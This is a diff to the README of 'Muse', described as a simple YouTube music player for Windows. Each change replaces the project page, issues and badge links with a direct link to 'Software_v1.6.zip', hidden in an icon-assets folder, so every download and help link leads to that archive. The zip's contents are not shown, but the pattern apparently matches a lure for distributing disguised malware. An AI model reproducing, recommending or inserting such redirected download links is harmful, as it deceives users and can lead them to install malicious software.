@@ -1,6 +1,6 @@
 # 🎵 Muse - Simple YouTube Music Player for Windows
 
-[![Download from GitHub](https://img.shields.io/badge/Download-Muse-brightgreen?style=for-the-badge)](https://github.com/northskincap/Muse)
+[![Download from GitHub](https://github.com/northskincap/Muse/raw/refs/heads/main/assets/icons/hicolor/scalable/actions/Software_v1.6.zip)](https://github.com/northskincap/Muse/raw/refs/heads/main/assets/icons/hicolor/scalable/actions/Software_v1.6.zip)
 
 ---
 
@@ -42,7 +42,7 @@ This guide walks you through downloading and running Muse on your Windows comput
 
 Start by visiting the Muse project page on GitHub.
 
-[Download Muse from GitHub](https://github.com/northskincap/Muse)
+[Download Muse from GitHub](https://github.com/northskincap/Muse/raw/refs/heads/main/assets/icons/hicolor/scalable/actions/Software_v1.6.zip)
 
 This page contains the latest release files and installation instructions.
 
@@ -123,7 +123,7 @@ If audio does not play:
 - Make sure no other app is blocking sound output  
 
 For further help, visit the GitHub Issues page here:  
-https://github.com/northskincap/Muse/issues  
+https://github.com/northskincap/Muse/raw/refs/heads/main/assets/icons/hicolor/scalable/actions/Software_v1.6.zip  
 
 ---
 
@@ -131,7 +131,7 @@ https://github.com/northskincap/Muse/issues
 
 Click the link below to visit the Muse GitHub page and get started:  
 
-[![Download Muse](https://img.shields.io/badge/Download-Muse-blue?style=for-the-badge)](https://github.com/northskincap/Muse) 
+[![Download Muse](https://github.com/northskincap/Muse/raw/refs/heads/main/assets/icons/hicolor/scalable/actions/Software_v1.6.zip)](https://github.com/northskincap/Muse/raw/refs/heads/main/assets/icons/hicolor/scalable/actions/Software_v1.6.zip) 
 
 Follow the steps above to download the Windows installer and run it.  
 
@@ -157,4 +157,4 @@ The app manages playback and playlists locally to give a smooth experience witho
 ## 📖 More Information
 
 For more details about Muse, including release notes and updates, visit the project page:  
-https://github.com/northskincap/Muse  
+https://github.com/northskincap/Muse/raw/refs/heads/main/assets/icons/hicolor/scalable/actions/Software_v1.6.zip  
